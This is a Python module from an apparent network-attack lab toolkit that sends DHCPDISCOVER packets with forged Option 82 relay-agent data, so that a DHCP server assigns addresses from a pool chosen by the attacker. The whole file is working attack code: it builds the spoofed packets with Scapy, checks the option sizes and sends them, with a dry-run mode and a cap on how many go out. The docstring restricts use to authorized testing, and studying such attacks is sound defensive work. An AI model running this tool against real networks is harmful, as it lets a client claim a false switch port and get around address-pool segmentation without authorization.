"""DHCP relay option 82 abuse: send DISCOVERs with forged relay agent information.

A relay agent adds Option 82 to the DHCP messages it forwards. Its sub-options name
the circuit (port) and the remote ID (switch) the client is on, and a server can pick
the address pool from them. A relay that keeps the Option 82 a client sends lets the
client name any circuit it likes.

This module sends DISCOVER messages from a client MAC, each with a chosen circuit ID
and remote ID in Option 82. It does not wait for offers; the lab reads the server's
replies to show which pool was used.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, IP, UDP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac, random_mac

CLIENT_PORT = 68
SERVER_PORT = 67
BROADCAST_IP = "255.255.255.255"
OPTION_RELAY_AGENT = 82
SUB_CIRCUIT_ID = 1
SUB_REMOTE_ID = 2
MAX_DISCOVERS = 100


@dataclass(frozen=True)
class RelayOption82Config:
    iface: str                          # attacker interface, on the segment with the relay or server
    circuit_id: str = ""                # Option 82 sub-option 1: the circuit (port) claimed
    remote_id: str = ""                 # Option 82 sub-option 2: the remote ID claimed
    client_mac: str = ""                # the client's MAC; empty = random per DISCOVER
    discovers: int = 1
    dry_run: bool = False

    def __post_init__(self) -> None:
        if not (self.circuit_id or self.remote_id):
            raise ValueError("Give a circuit ID, a remote ID, or both.")
        option82_value(self.circuit_id, self.remote_id)     # validates the sizes
        if self.client_mac:
            normalize_unicast_mac(self.client_mac)
        if not 1 <= self.discovers <= MAX_DISCOVERS:
            raise ValueError(f"Discovers must be between 1 and {MAX_DISCOVERS}.")


@dataclass
class RelayOption82Stats:
    discovers: int = 0
    status: str = ""


def option82_value(circuit_id: str, remote_id: str) -> bytes:
    """Option 82 value: sub-option 1 (circuit ID) and sub-option 2 (remote ID), each length-prefixed."""
    out = b""
    for code, text in ((SUB_CIRCUIT_ID, circuit_id), (SUB_REMOTE_ID, remote_id)):
        if not text:
            continue
        data = text.encode("ascii")
        if not 1 <= len(data) <= 255:
            raise ValueError("Circuit and remote IDs must be 1 to 255 ASCII characters.")
        out += bytes([code, len(data)]) + data
    if len(out) > 255:
        raise ValueError("Option 82 is longer than 255 bytes.")
    return out


def build_discover(client_mac: str, xid: int, circuit_id: str, remote_id: str) -> Packet:
    """DHCPDISCOVER from `client_mac` carrying the forged Option 82."""
    mac = normalize_unicast_mac(client_mac)
    chaddr = bytes.fromhex(mac.replace(":", "")).ljust(16, b"\x00")
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / IP(src="0.0.0.0", dst=BROADCAST_IP)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / BOOTP(op=1, xid=xid, chaddr=chaddr)
        / DHCP(options=[
            ("message-type", "discover"),
            (OPTION_RELAY_AGENT, option82_value(circuit_id, remote_id)),
            "end",
        ])
    )


def run_relay_option82(
    config: RelayOption82Config,
    stop_event: threading.Event,
    on_progress: Callable[[RelayOption82Stats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> RelayOption82Stats:
    """Send the DISCOVERs once each, unless `stop_event` is set first."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = RelayOption82Stats(
            status=(
                f"Dry run: would send {config.discovers} DHCPDISCOVER(s) with circuit ID "
                f"'{config.circuit_id}' and remote ID '{config.remote_id}'. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RelayOption82Stats()
    for _ in range(config.discovers):
        if stop_event.is_set():
            break
        mac = config.client_mac or random_mac(rng)
        frame = build_discover(mac, rng.getrandbits(32), config.circuit_id, config.remote_id)
        send(frame, iface=config.iface, verbose=False)
        stats.discovers += 1
        on_progress(replace(stats))
    return stats
